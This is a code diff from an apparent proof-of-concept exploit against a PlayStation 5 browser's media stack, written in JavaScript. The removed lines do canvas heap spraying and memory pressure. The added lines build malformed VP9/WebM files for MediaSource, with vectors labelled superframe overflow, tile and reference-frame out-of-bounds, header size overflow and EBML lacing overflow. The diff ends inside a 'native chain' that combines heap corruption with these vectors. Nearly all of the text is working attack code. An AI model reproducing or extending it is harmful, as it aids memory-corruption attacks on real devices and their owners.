-    const cluster = buildEBML([0x1F,0x43,0xB6,0x75], clusterContent);
-    
-    // Segment
-    const segment = buildEBML([0x18,0x53,0x80,0x67], cluster);
-    
-    const result = new Uint8Array(ebml.length + segment.length);
-    result.set(ebml, 0);
-    result.set(segment, ebml.length);
-    
-    log('Built '+result.length+' bytes fake VP9 WebM', 'info');
-    
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    sb.appendBuffer(result);
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 5000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
-    });
-    
-    log('Fake VP9 WebM: completed', 'ok');
-    log('readyState='+v.readyState, 'info');
-    
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('VP9 frame error: '+e.name+': '+e.message, 'err');
+// WebM/EBML container builder
+function makeWebMWithVP9(vp9Frame, opts) {
+  opts = opts || {};
+
+  function ebmlID(id) {
+    if (id <= 0xFF)     return [id];
+    if (id <= 0xFFFF)   return [(id>>8)&0xFF, id&0xFF];
+    if (id <= 0xFFFFFF) return [(id>>16)&0xFF,(id>>8)&0xFF,id&0xFF];
+    return [(id>>24)&0xFF,(id>>16)&0xFF,(id>>8)&0xFF,id&0xFF];
   }
+
+  function ebmlSize(sz) {
+    if (sz < 0)        return [0xFF]; // unknown size
+    if (sz < 0x7E)     return [sz | 0x80];
+    if (sz < 0x3FFE)   return [(sz>>8)|0x40, sz&0xFF];
+    if (sz < 0x1FFFFE) return [(sz>>16)|0x20,(sz>>8)&0xFF,sz&0xFF];
+    return [0x10,(sz>>24)&0xFF,(sz>>16)&0xFF,(sz>>8)&0xFF,sz&0xFF];
+  }
+
+  function ebmlUint(val, bytes) {
+    var r = [];
+    for (var i=bytes-1;i>=0;i--) r.push((val>>(i*8))&0xFF);
+    return r;
+  }
+
+  function el(id, data) {
+    var idBytes   = ebmlID(id);
+    var sizeBytes = opts.huge_size ? [0x01,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF] : ebmlSize(data.length);
+    return idBytes.concat(sizeBytes).concat(Array.from(data));
+  }
+
+  var frameData = Array.from(vp9Frame);
+
+  // SimpleBlock: header + VP9 frame
+  // [TrackNumber varint][timecode 2B][flags 1B][data]
+  var trackNum = [0x81]; // track 1 as varint
+  var timecode = [0x00, 0x00]; // 0ms
+  var flags    = opts.lacing ? 0x06 : 0x00; // 0x06 = keyframe + EBML lacing
+  var sbHeader = trackNum.concat(timecode).concat([flags]);
+
+  var simpleBlock = el(0xA3, sbHeader.concat(frameData));
+
+  // Cluster
+  var clusterTimecode = el(0xE7, ebmlUint(0, 8));
+  var cluster = el(0x1F43B675, clusterTimecode.concat(simpleBlock));
+
+  // TrackEntry
+  var trackEntryData = [].concat(
+    el(0xD7, ebmlUint(1, 1)),                    // TrackNumber
+    el(0x73C5, ebmlUint(1, 8)),                  // TrackUID
+    el(0x83, ebmlUint(1, 1)),                    // TrackType = video
+    el(0x86, Array.from(new TextEncoder().encode('V_VP9'))), // CodecID
+    el(0xE0, [].concat(                          // Video element
+      el(0xB0, ebmlUint(opts.width  || 320, 4)),
+      el(0xBA, ebmlUint(opts.height || 240, 4))
+    ))
+  );
+  var tracks = el(0x1654AE6B, el(0xAE, trackEntryData));
+
+  // Info segment
+  var segInfo = el(0x1549A966, [].concat(
+    el(0x2AD7B1, ebmlUint(1000000, 8)),  // TimecodeScale = 1ms
+    el(0x4489, ebmlUint(0, 8))           // Duration
+  ));
+
+  // Segment
+  var segContent = [].concat(segInfo, tracks, cluster);
+  var segment = el(0x18538067, segContent);
+
+  // EBML Header
+  var ebmlHeader = el(0x1A45DFA3, [].concat(
+    el(0x4286, ebmlUint(1, 1)),         // EBMLVersion
+    el(0x42F7, ebmlUint(1, 1)),         // EBMLReadVersion
+    el(0x4282, Array.from(new TextEncoder().encode('webm'))), // DocType
+    el(0x4287, ebmlUint(4, 1)),         // DocTypeVersion
+    el(0x4285, ebmlUint(2, 1))          // DocTypeReadVersion
+  ));
+
+  return new Uint8Array(ebmlHeader.concat(segment));
 }
 
-// ============================================================
-// 2. Canvas Heap Spray + Timing
-// ============================================================
-function canvasSingleTiming() {
-  log('=== ⏱ Single Allocation Timing ===', 'ok');
-  const sizes = [0x1000, 0x2000, 0x4000, 0x6000, 0x8000, 0xA000, 0xC000];
-  
-  for (const size of sizes) {
-    const mb = (size * size * 4 / 1024 / 1024).toFixed(1);
+// Minimal valid MP4 for MSE setup
+function makeMinimalMP4() {
+  function box(type, data) {
+    var size = 8 + data.length;
+    var buf  = new Uint8Array(size);
+    buf[0]=(size>>24)&0xFF; buf[1]=(size>>16)&0xFF;
+    buf[2]=(size>>8)&0xFF;  buf[3]=size&0xFF;
+    buf[4]=type.charCodeAt(0); buf[5]=type.charCodeAt(1);
+    buf[6]=type.charCodeAt(2); buf[7]=type.charCodeAt(3);
+    buf.set(data, 8);
+    return buf;
+  }
+  var ftyp = box('ftyp', new Uint8Array([
+    0x69,0x73,0x6F,0x6D, // isom
+    0x00,0x00,0x02,0x00, // minor version
+    0x69,0x73,0x6F,0x6D, // isom
+    0x61,0x76,0x63,0x31  // avc1
+  ]));
+  var moov = box('moov', new Uint8Array([
+    0x00,0x00,0x00,0x6C, // size of mvhd
+    0x6D,0x76,0x68,0x64, // mvhd
+    0x00,                 // version 0
+    0x00,0x00,0x00,       // flags
+    0x00,0x00,0x00,0x00,  // creation time
+    0x00,0x00,0x00,0x00,  // modification time
+    0x00,0x00,0x03,0xE8,  // timescale = 1000
+    0x00,0x00,0x00,0x00,  // duration = 0
+    0x00,0x01,0x00,0x00,  // rate = 1.0
+    0x01,0x00,            // volume = 1.0
+    0x00,0x00,            // reserved
+    0x00,0x00,0x00,0x00,  // reserved
+    0x00,0x00,0x00,0x00,  // reserved
+    // matrix (9 x 4 bytes = 36 bytes)
+    0x00,0x01,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x01,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x40,0x00,0x00,0x00,
+    // pre_defined (6 x 4 = 24 bytes)
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+    // next_track_id
+    0x00,0x00,0x00,0x01
+  ]));
+  var total = ftyp.length + moov.length;
+  var out   = new Uint8Array(total);
+  out.set(ftyp, 0); out.set(moov, ftyp.length);
+  return out;
+}
+
+// ─── VP9 FUZZ VECTORS ─────────────────────────────────────────────────────────
+
+function appendAndLog(label, webmData, cb) {
+  setupMSE('video/webm; codecs="vp9"', function(sb) {
+    inf('[' + label + '] WebM size: ' + webmData.length + ' bytes');
+    sb.addEventListener('error', function(e) {
+      hit('[' + label + '] SourceBuffer ERROR — native decoder rejected or crashed');
+    });
+    sb.addEventListener('updateend', function() {
+      ok('[' + label + '] appendBuffer completed — native decoder accepted input');
+      ok('[' + label + '] buffered.length = ' + sb.buffered.length);
+      if (cb) cb(sb);
+    });
     try {
-      const c = document.createElement('canvas');
-      const ctx = c.getContext('2d');
-      const t0 = performance.now();
-      const id = ctx.createImageData(size, size);
-      const elapsed = performance.now() - t0;
-      log(size+'x'+size+' ('+mb+'MB): '+elapsed.toFixed(2)+'ms', 'ok');
+      sb.appendBuffer(webmData);
+      ok('[' + label + '] appendBuffer() called — data → appendInternal() → PSSourceBufferBackend');
     } catch(e) {
-      log(size+'x'+size+' ('+mb+'MB): '+e.name, 'err');
+      hit('[' + label + '] appendBuffer threw: ' + e.name + ': ' + e.message);
     }
-  }
+  });
 }
 
-async function canvasRapidTiming() {
-  log('=== ⏱ Rapid Allocation Timing ===', 'ok');
-  const size = 0x4000; // 16384 = 1GB
-  const mb = (size * size * 4 / 1024 / 1024).toFixed(0);
-  
-  for (let i = 0; i < 5; i++) {
-    try {
-      const c = document.createElement('canvas');
-      const ctx = c.getContext('2d');
-      const t0 = performance.now();
-      const id = ctx.createImageData(size, size);
-      const elapsed = performance.now() - t0;
-      log('Alloc '+i+': '+mb+'MB in '+elapsed.toFixed(0)+'ms', elapsed > 100 ? 'warn' : 'ok');
-      await new Promise(r => setTimeout(r, 500));
-    } catch(e) {
-      log('Alloc '+i+': '+e.name, 'err');
-      break;
-    }
+// ─── VECTOR 4: Superframe Overflow ───────────────────────────────────────────
+function fuzzSuperframe() {
+  clr('[4] VP9 Superframe Overflow → PSSourceBufferBackend');
+  inf('[*] Superframe index: marker byte claims 255 frames (max = 8 per VP9 spec)');
+  inf('[*] Decoder allocates frames*sizeof(FrameSize) — integer overflow if unchecked');
+  inf('[*] Path: appendBuffer → appendInternal → PSSourceBufferBackend::append()');
+  sep();
+
+  // Build 8 valid VP9 frames (VP9 spec max is 8 per superframe)
+  var frames = [];
+  for (var i = 0; i < 8; i++) {
+    frames.push(makeVP9KeyFrame({ width: 64, height: 64 }));
   }
+  var validSuper = makeSuperframe(frames);
+
+  // Now craft malicious superframe: claim 255 frames but only provide 1
+  // Manually build the superframe index with wrong count
+  var badFrame   = makeVP9KeyFrame({ width: 64, height: 64 });
+  var badMarker  = 0xC0 | 0x1F; // claim 32 frames (max bits = 5)
+  var szLen      = 3; // 3 bytes per size entry
+  var badIndex   = [badMarker];
+  // Claim each frame is 0xFFFFFF bytes
+  for (var j = 0; j < 32; j++) {
+    badIndex.push(0xFF); badIndex.push(0xFF); badIndex.push(0xFF);
+  }
+  badIndex.push(badMarker);
+  var badSuper = new Uint8Array(
+    Array.from(badFrame).concat(Array.from(new Uint8Array(badIndex)))
+  );
+
+  inf('[*] Test A: Valid superframe (8 frames, correct index)');
+  var webmValid = makeWebMWithVP9(validSuper);
+  appendAndLog('superframe-valid', webmValid, function() {
+    sep();
+    inf('[*] Test B: Malicious superframe (claims 32 frames, index says 0xFFFFFF each)');
+    inf('[*] Expected: native decoder tries to allocate 32 * 0xFFFFFF = overflow');
+    var webmBad = makeWebMWithVP9(badSuper);
+    appendAndLog('superframe-OVERFLOW', webmBad);
+  });
 }
 
-async function canvasPressureBuildup() {
-  log('=== 💥 Memory Pressure Buildup ===', 'err');
-  log('This will allocate multiple large canvases rapidly...', 'warn');
-  
-  const canvases = [];
-  const sizes = [0x4000, 0x4000, 0x4000, 0x5000, 0x5000, 0x6000];
-  
-  for (let i = 0; i < sizes.length; i++) {
-    const size = sizes[i];
-    const mb = (size * size * 4 / 1024 / 1024).toFixed(0);
-    try {
-      const c = document.createElement('canvas');
-      const ctx = c.getContext('2d');
-      const t0 = performance.now();
-      const id = ctx.createImageData(size, size);
-      const elapsed = performance.now() - t0;
-      canvases.push(c);
-      log('Pressure '+i+': '+size+'x'+size+' ('+mb+'MB) in '+elapsed.toFixed(0)+'ms', elapsed > 500 ? 'warn' : 'ok');
-    } catch(e) {
-      log('Pressure '+i+': '+e.name, 'err');
-      break;
-    }
-    await new Promise(r => setTimeout(r, 200));
-  }
-  
-  log('Total canvases: '+canvases.length, 'info');
-}
+// ─── VECTOR 5: Tile Array OOB ────────────────────────────────────────────────
+function fuzzTileOOB() {
+  clr('[5] VP9 Tile Array OOB → PSSourceBufferBackend');
+  inf('[*] tile_cols_log2=6 (64 cols) × tile_rows_log2=6 (64 rows) = 4096 tiles');
+  inf('[*] Decoder allocates tiles array: n_cols * n_rows * sizeof(TileData)');
+  inf('[*] With tiny frame (64×64) having 64×64 tiles: each tile = 1 pixel');
+  inf('[*] If tile count > actual MB count: OOB read in tile loop');
+  sep();
 
-function canvasSprayPattern() {
-  log('=== 🎯 Heap Spray Pattern ===', 'ok');
-  // Allocate objects with specific patterns
-  const PATTERN = 0x41414141;
-  const arrays = [];
-  
-  for (let i = 0; i < 100; i++) {
-    const arr = new Uint32Array(0x1000);
-    arr.fill(PATTERN + i);
-    arrays.push(arr);
-  }
-  
-  log('Sprayed 100 arrays x 16KB with pattern 0x'+PATTERN.toString(16), 'ok');
-  log('Total: '+(100 * 16 / 1024).toFixed(2)+'MB', 'info');
-  
-  // Verify patterns
-  let corrupted = 0;
-  for (let i = 0; i < arrays.length; i++) {
-    if (arrays[i][0] !== PATTERN + i) corrupted++;
-  }
-  log('Corrupted arrays: '+corrupted, corrupted > 0 ? 'err' : 'ok');
-}
+  var vectors = [
+    { tile_cols_log2: 0, tile_rows_log2: 0, label: 'tile-baseline (1x1)' },
+    { tile_cols_log2: 2, tile_rows_log2: 2, label: 'tile-4x4' },
+    { tile_cols_log2: 6, tile_rows_log2: 0, label: 'tile-64col (max cols)' },
+    { tile_cols_log2: 6, tile_rows_log2: 2, label: 'tile-64col-4row' },
+    { tile_cols_log2: 6, tile_rows_log2: 6, label: 'tile-64x64 OOB TARGET' },
+  ];
 
-// ============================================================
-// 3. MSE WebM VP9
-// ============================================================
-async function mseWebMVP9() {
-  log('=== 🧪 MSE + WebM/VP9 ===', 'ok');
-  try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    const data = buildMinimalWebM();
-    sb.appendBuffer(data);
-    
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 3000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
+  function runNext(idx) {
+    if (idx >= vectors.length) { ok('[*] Tile vectors complete'); return; }
+    var v = vectors[idx];
+    var frame = makeVP9KeyFrame({
+      width: 64, height: 64,
+      tile_cols_log2: v.tile_cols_log2,
+      tile_rows_log2: v.tile_rows_log2
     });
-    
-    log('MSE WebM/VP9: appendBuffer completed', 'ok');
-    log('readyState='+v.readyState+' networkState='+v.networkState, 'info');
-    
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('MSE WebM error: '+e.name+': '+e.message, 'err');
+    var webm = makeWebMWithVP9(frame, { width: 64, height: 64 });
+    inf('[*] ' + v.label + ' tiles=' +
+        (1<<v.tile_cols_log2) + 'x' + (1<<v.tile_rows_log2));
+    appendAndLog(v.label, webm, function() { setTimeout(function(){runNext(idx+1);},200); });
   }
+  runNext(0);
 }
 
-async function mseWebMCorrupt() {
-  log('=== 🔥 MSE + Corrupt WebM ===', 'gold');
-  try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    // Corrupt: random data
-    const corrupt = new Uint8Array(0x1000);
-    for (let i = 0; i < corrupt.length; i++) corrupt[i] = Math.floor(Math.random() * 256);
-    
-    sb.appendBuffer(corrupt);
-    
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 3000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
-    });
-    
-    log('Corrupt WebM MSE: completed', 'ok');
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('Corrupt WebM MSE error: '+e.name+': '+e.message, 'err');
-  }
-}
+// ─── VECTOR 6: Reference Frame OOB ───────────────────────────────────────────
+function fuzzRefFrame() {
+  clr('[6] VP9 Reference Frame OOB → PSSourceBufferBackend');
+  inf('[*] VP9 inter frames reference up to 3 slots (LAST/GOLDEN/ALT)');
+  inf('[*] ref_frame_idx must be in [0..7] (3 reference frame buffers)');
+  inf('[*] Crafting inter frame with ref_frame_idx = 0xFF → OOB reference buffer access');
+  sep();
 
-async function mseWebMSequence() {
-  log('=== 🔥 WebM Sequence: append→seek→append ===', 'gold');
-  try {
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    const data = buildMinimalWebM();
-    
-    // Step 1
-    sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
-    log('Step 1: append OK', 'ok');
-    
-    // Step 2: Seek
-    v.currentTime = 1;
-    log('Step 2: seek to 1s', 'ok');
-    
-    // Step 3: Append again
-    sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
-    log('Step 3: append again OK', 'ok');
-    
-    // Step 4: Seek to huge time
+  // For inter frames we need a key frame first
+  var keyFrame = makeVP9KeyFrame({ width: 64, height: 64 });
+  var keyWebM  = makeWebMWithVP9(keyFrame, { width: 64, height: 64 });
+
+  inf('[*] Step 1: Append valid key frame (initialise reference buffer)');
+  appendAndLog('ref-keyframe', keyWebM, function(sb) {
+    sep();
+    inf('[*] Step 2: Append inter frame with ref_frame_idx = 0xFF (OOB)');
+    inf('[*] Target: PSSourceBufferBackend inter-frame predictor reads frame[0xFF]');
+
+    // Craft an inter VP9 frame manually
+    var interBits = [];
+    interBits = interBits.concat(bits(2, 2));     // frame_marker
+    interBits.push(0);                            // profile low = 0
+    interBits.push(0);                            // profile high = 0
+    interBits.push(0);                            // show_existing_frame = 0
+    interBits.push(1);                            // frame_type = 1 (INTER)
+    interBits.push(1);                            // show_frame = 1
+    interBits.push(0);                            // error_resilient = 0
+    interBits.push(0);                            // intra_only = 0
+
+    // reset_frame_context (2 bits)
+    interBits = interBits.concat(bits(0, 2));
+    // refresh_frame_flags (8 bits)
+    interBits = interBits.concat(bits(0, 8));
+    // ref_frame_idx[0,1,2] — each 3 bits — set to 0xFF masked to 3 bits = 7
+    // But try to encode 0xFF in 3 bits → max valid is 7
+    // The attack: provide index 7 when only 0-2 may be initialized
+    interBits = interBits.concat(bits(7, 3)); // LAST
+    interBits = interBits.concat(bits(7, 3)); // GOLDEN
+    interBits = interBits.concat(bits(7, 3)); // ALT
+    // ref_frame_sign_bias[1,2,3]
+    interBits.push(1); interBits.push(1); interBits.push(1);
+    // frame_size_with_refs
+    interBits.push(0); // found_ref[0] = 0
+    interBits.push(0); // found_ref[1] = 0
+    interBits.push(0); // found_ref[2] = 0
+    // explicitly specify size
+    interBits = interBits.concat(bits(64-1, 16)); // width
+    interBits = interBits.concat(bits(64-1, 16)); // height
+    // render_and_frame_size_different
+    interBits.push(0);
+    // allow_high_precision_mv
+    interBits.push(0);
+    // interp_filter: 3 bits (LITERAL: 0=EIGHTTAP)
+    interBits.push(0); // is_filter_switchable = 0
+    interBits = interBits.concat(bits(0, 2)); // raw_interp_filter
+
+    var interBytes = bitsToBytes(interBits);
+    var interFrame = new Uint8Array([0x49, 0x83, 0x42].concat(interBytes).concat(
+      new Array(64).fill(0) // extra payload
+    ));
+
+    // Replace source buffer content
     try {
-      v.currentTime = 1e+300;
-      log('Step 4: seek to 1e+300 — OK (unexpected)', 'warn');
+      sb.appendBuffer(makeWebMWithVP9(interFrame, { width: 64, height: 64 }));
+      ok('[*] Inter frame with ref_frame_idx=7 submitted');
     } catch(e) {
-      log('Step 4: seek to 1e+300 — '+e.name, 'err');
+      hit('[*] Inter frame append threw: ' + e.name + ': ' + e.message);
     }
-    
-    URL.revokeObjectURL(url);
-  } catch(e) {
-    log('WebM sequence error: '+e.name+': '+e.message, 'err');
-  }
+  });
 }
 
-// ============================================================
-// 4. Combined
-// ============================================================
-async function combinedWebMCanvas() {
-  log('=== 🔥 Combined: WebM + Canvas Pressure ===', 'err');
-  
-  try {
-    // Step 1: Build pressure
-    log('Step 1: Building canvas pressure...', 'info');
-    const canvases = [];
-    for (let i = 0; i < 3; i++) {
-      const c = document.createElement('canvas');
-      const ctx = c.getContext('2d');
-      ctx.createImageData(0x4000, 0x4000);
-      canvases.push(c);
-      log('Canvas '+i+': 1GB allocated', 'info');
-    }
-    
-    // Step 2: WebM append under pressure
-    log('Step 2: WebM append under pressure...', 'info');
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    const data = buildMinimalWebM();
-    sb.appendBuffer(data);
-    
-    await new Promise((resolve) => {
-      const t = setTimeout(() => resolve('timeout'), 5000);
-      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});
-      sb.addEventListener('error', () => { clearTimeout(t); resolve('error'); }, {once:true});
+// ─── VECTOR 7: Compressed Header Size Overflow ───────────────────────────────
+function fuzzCompHeader() {
+  clr('[7] VP9 Compressed Header Size Overflow');
+  inf('[*] compressed_header_size field claims 0xFFFF bytes of data follow');
+  inf('[*] If decoder allocates based on this field: heap OOB read/write');
+  inf('[*] VP9 spec: compressed header encodes transform mode, ref frame probs, etc.');
+  sep();
+
+  var sizes = [0, 1, 0xFF, 0x1000, 0x7FFF, 0xFFFF];
+  function runSize(idx) {
+    if (idx >= sizes.length) { ok('[*] Compressed header vectors done'); return; }
+    var sz    = sizes[idx];
+    var frame = makeVP9KeyFrame({
+      width: 64, height: 64,
+      compressed_header_size: sz,
+      payload_size: Math.min(sz, 256),  // actual payload — always smaller
+      payload_byte: 0x41
     });
-    
-    log('Combined: WebM append under pressure completed', 'ok');
-    URL.revokeObjectURL(url);
-    
-  } catch(e) {
-    log('Combined error: '+e.name+': '+e.message, 'err');
+    var webm = makeWebMWithVP9(frame, { width: 64, height: 64 });
+    inf('[*] compressed_header_size=0x' + sz.toString(16) + ' actual_payload=256');
+    appendAndLog('compHdr-0x' + sz.toString(16), webm,
+      function() { setTimeout(function(){ runSize(idx+1); }, 200); });
   }
+  runSize(0);
 }
 
-async function combinedAll() {
-  log('=== 🔥🔥 ULTIMATE: WebM + Canvas + Atomics + MSE ===', 'err');
-  
-  try {
-    // Atomics setup
-    const ab = new ArrayBuffer(64);
-    const i32 = new Int32Array(ab);
-    i32[0] = 0;
-    
-    // Canvas pressure
-    log('Phase 1: Canvas pressure (2x 1GB)...', 'info');
-    const c1 = document.createElement('canvas');
-    c1.getContext('2d').createImageData(0x4000, 0x4000);
-    const c2 = document.createElement('canvas');
-    c2.getContext('2d').createImageData(0x4000, 0x4000);
-    
-    // Atomics mutation
-    log('Phase 2: Atomics mutation...', 'info');
-    Atomics.add(i32, 0, 0xDEADBEEF);
-    log('Atomics result: 0x'+i32[0].toString(16), 'info');
-    
-    // WebM MSE
-    log('Phase 3: WebM MSE...', 'info');
-    const ms = new MediaSource();
-    const url = URL.createObjectURL(ms);
-    const v = document.createElement('video');
-    v.src = url; v.muted = true;
-    
-    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
-    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
-    
-    const data = buildMinimalWebM();
-    sb.appendBuffer(data);
-    await new Promise(r => sb.addEventListener('updateend', r, {once:true}));
-    
-    log('Phase 3: WebM append OK', 'ok');
-    
-    // MP4 MSE simultaneously
-    log('Phase 4: MP4 MSE simultaneously...', 'info');
-    const ms2 = new MediaSource();
-    const url2 = URL.createObjectURL(ms2);
-    const v2 = document.createElement('video');
-    v2.src = url2; v2.muted = true;
-    
-    await new Promise(r => ms2.addEventListener('sourceopen', r, {once:true}));
-    const sb2 = ms2.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
-    
-    const mp4 = new Uint8Array([
-      0x00,0x00,0x00,0x20, 0x66,0x74,0x79,0x70,
-      0x69,0x73,0x6f,0x6d, 0x00,0x00,0x02,0x00,
-      0x69,0x73,0x6f,0x6d, 0x6d,0x70,0x34,0x31,
-      0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
-    ]);
-    sb2.appendBuffer(mp4);
-    await new Promise(r => sb2.addEventListener('updateend', r, {once:true}));
-    
-    log('Phase 4: MP4 append OK', 'ok');
-    log('ULTIMATE: All phases completed!', 'ok');
-    
-    URL.revokeObjectURL(url);
-    URL.revokeObjectURL(url2);
-    
-  } catch(e) {
-    log('ULTIMATE error: '+e.name+': '+e.message, 'err');
-  }
+// ─── VECTOR 8: Segmentation OOB ──────────────────────────────────────────────
+function fuzzSegmentation() {
+  clr('[8] VP9 Segmentation OOB');
+  inf('[*] segmentation_enabled=1, seg_id_bits overflow');
+  inf('[*] VP9 spec: max 8 segments. If decoder iterates > 8: OOB in segment_data[]');
+  sep();
+
+  var frame = makeVP9KeyFrame({
+    width: 64, height: 64,
+    segmentation_enabled: true,
+    num_segments: 8,
+    seg_prob: 128,
+    seg_feature_enabled: true
+  });
+  var webm = makeWebMWithVP9(frame, { width: 64, height: 64 });
+  appendAndLog('segmentation-maxfeatures', webm);
 }
 
-// Global handlers
-window.onerror = (m,u,l,c,e) => { log('GLOBAL: '+m+' @'+l+':'+c, 'err'); };
-window.onunhandledrejection = e => { log('REJECTION: '+e.reason, 'err'); };
-log('PoC v8 loaded. WebM Fuzzing + Canvas Heap Spray.', 'ok');
-log('WebM VP9 backend is a NEW attack surface on PS5!', 'warn');
+// ─── VECTOR 9: EBML Lacing Overflow ──────────────────────────────────────────
+function fuzzEBMLLace() {
+  clr('[9] WebM EBML Lacing Overflow');
+  inf('[*] EBML lacing: SimpleBlock with lace_count=255, each lace_size claiming huge data');
+  inf('[*] PSSourceBufferBackend EBML parser must handle lace counts and sizes');
+  inf('[*] If lace count × lace_size overflows: OOB in block data reader');
+  sep();
+
+  // SimpleBlock with EBML lacing:
+  // flags: keyframe(0x80) | lacing(0x06) = 0x86
+  // lace_count = 255 (1 byte, 0 = 1 frame, 0xFF = 256 frames)
+  // Then EBML-encoded size differences
+
+  var trackNum = [0x81]; // track 1
+  var timecode = [0x00, 0x00];
+  var flags    = [0x86]; // keyframe + EBML lacing
+
+  // Lace count (number of frames - 1)
+  var laceCount = [0xFF]; // claim 256 laces
+
+  // First lace size: EBML varint claiming 0x1FFFFE bytes
+  // 0x20 0xFF 0xFE = 0x1FFFFE in EBML varint
+  var firstLaceSize = [0x20, 0xFF, 0xFE];
+
+  // Subsequent sizes: signed EBML varint (delta encoding)
+  // Claim each subsequent frame is also huge (delta 0)
+  var subLaceSizes = [];
+  for (var k = 0; k < 50; k++) {
+    // EBML signed varint 0: [0x80] = size 0 (same as previous)
+    subLaceSizes.push(0x80);
+  }
+
+  // Tiny actual data payload (far less than claimed)
+  var fakePayload = new Array(64).fill(0x42);
+
+  var blockContent = [].concat(
+    trackNum, timecode, flags,
+    laceCount, firstLaceSize, subLaceSizes,
+    fakePayload
+  );
+
+  // Build WebM with this malicious SimpleBlock manually
+  function ebmlEl(id, data) {
+    var idB  = id <= 0xFF ? [id] : [(id>>8)&0xFF, id&0xFF];
+    var sz   = data.length;
+    var szB  = sz < 0x7F ? [sz|0x80] : [(sz>>8)|0x40, sz&0xFF];
+    return idB.concat(szB).concat(Array.from(data));
+  }
+
+  var simpleBlock  = ebmlEl(0xA3, blockContent);
+  var clusterTC    = ebmlEl(0xE7, [0x80]); // timecode = 0 (varint)
+  var cluster      = ebmlEl(0x1F43B675, [].concat(clusterTC, simpleBlock));
+  var trackEntry   = ebmlEl(0xAE, [].concat(
+    ebmlEl(0xD7, [0x01]),
+    ebmlEl(0x73C5, [0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01]),
+    ebmlEl(0x83, [0x01]),
+    ebmlEl(0x86, Array.from(new TextEncoder().encode('V_VP9')))
+  ));
+  var tracks    = ebmlEl(0x1654AE6B, trackEntry);
+  var segInfo   = ebmlEl(0x1549A966, [].concat(
+    ebmlEl(0x2AD7B1, [0x0F,0x42,0x40]), // 1000000ns
+    ebmlEl(0x4489, [0x80])
+  ));
+  var segBody   = [].concat(segInfo, tracks, cluster);
+  var segment   = ebmlEl(0x18538067, segBody);
+  var ebmlHdr   = ebmlEl(0x1A45DFA3, [].concat(
+    ebmlEl(0x4286, [0x01]),
+    ebmlEl(0x42F7, [0x01]),
+    ebmlEl(0x4282, Array.from(new TextEncoder().encode('webm'))),
+    ebmlEl(0x4287, [0x04]),
+    ebmlEl(0x4285, [0x02])
+  ));
+
+  var webm = new Uint8Array(ebmlHdr.concat(segment));
+  inf('[*] EBML SimpleBlock: flags=0x86 (laced), lace_count=0xFF (256), firstSize=0x1FFFFE');
+  inf('[*] Actual data: 64 bytes — decoder reads far past end if no bounds check');
+  appendAndLog('ebml-lacing-OVERFLOW', webm);
+}
+
+// ─── 3. RUN ALL VECTORS ───────────────────────────────────────────────────────
+function fuzzVP9All() {
+  clr('[3] VP9 Fuzzer — All Vectors Sequential');
+  inf('[*] Running: Superframe → Tile OOB → Ref Frame → Comp Header → Segmentation → EBML Lace');
+  sep();
+
+  var steps = [fuzzSuperframe, fuzzTileOOB, fuzzRefFrame,
+               fuzzCompHeader, fuzzSegmentation, fuzzEBMLLace];
+  var i = 0;
+  function next() {
+    if (i >= steps.length) { ok('[*] All VP9 vectors complete'); return; }
+    var fn = steps[i++];
+    setTimeout(function() { fn(); setTimeout(next, 2000); }, 100);
+  }
+  next();
+}
+
+// ─── FULL NATIVE CHAIN ────────────────────────────────────────────────────────
+function chainNative() {
+  clr('[NATIVE CHAIN] buffered() UAR → Heap Corruption → VP9 Fuzzer');
